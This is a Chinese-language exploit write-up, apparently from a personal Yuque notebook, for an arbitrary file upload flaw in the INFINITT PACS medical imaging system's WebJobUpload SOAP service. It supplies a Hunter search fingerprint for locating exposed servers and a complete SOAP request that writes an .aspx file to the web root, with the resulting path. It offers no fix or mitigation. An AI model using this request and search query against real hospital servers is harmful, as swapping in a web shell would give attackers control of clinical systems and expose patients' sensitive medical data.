# 英飞达影像存档与通讯(PACS)系统INFINITT PACS WebJobUpload存在任意文件上传漏洞

# 一、漏洞简介
英飞达是一家专业开发医学影像系统的公司，成立于1994年，早年PACS产品双子星：EFILM和PiviewSTAR，其中PiviewSTAR为我公司产品。2011年于KOSDAQ上市。产品覆盖放射、超声、内镜、病理、电生理、放疗等所有检查医技科室，生态支持单院区、多院区、区域、医联体、集团化、移动端、云端、互联网应用。客户数量多，全球6000多客户的选择，美国中小医院KLAS排第一，台湾前二，日本前三，另有德国，英国，中东，巴西，东南亚等多个地区设有分公司。中国三甲医院数量前三，西南、西北区优质客户数量第一。INFINITT PACS WebJobUpload接口存在任意文件上传漏洞 ，攻击者可通过该漏洞获取服务器权限，严重甚至导致医院的敏感病人数据泄露。

# 二、影响版本
+ 英飞达影像存档与通讯(PACS)系统INFINITT PACS

# 三、资产测绘
+ hunter`web.icon="0cd46e0cba3abd067cd28e70eb7f2a5f"`
+ 特征

![1710050678798-3d2b7109-13a0-46c1-aa6a-f84048d5ce82.png](./img/8DdfWo-hBXKeoTtD/1710050678798-3d2b7109-13a0-46c1-aa6a-f84048d5ce82-135359.png)

# 四、漏洞复现
```plain
POST /webservices/WebJobUpload.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://rainier/jobUpload"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>2.aspx</fileName>
<bufValue>MTIz</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
```

![1710050894692-a465d756-5bf4-4db3-88b1-7c5c27a607f8.png](./img/8DdfWo-hBXKeoTtD/1710050894692-a465d756-5bf4-4db3-88b1-7c5c27a607f8-425462.png)

```plain
/1/2.aspx
```

![1710050917663-a92660df-3fce-4504-a866-51789deb2860.png](./img/8DdfWo-hBXKeoTtD/1710050917663-a92660df-3fce-4504-a866-51789deb2860-606481.png)



> 更新: 2024-05-15 15:36:03  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wu6h6bbwq3zx751r>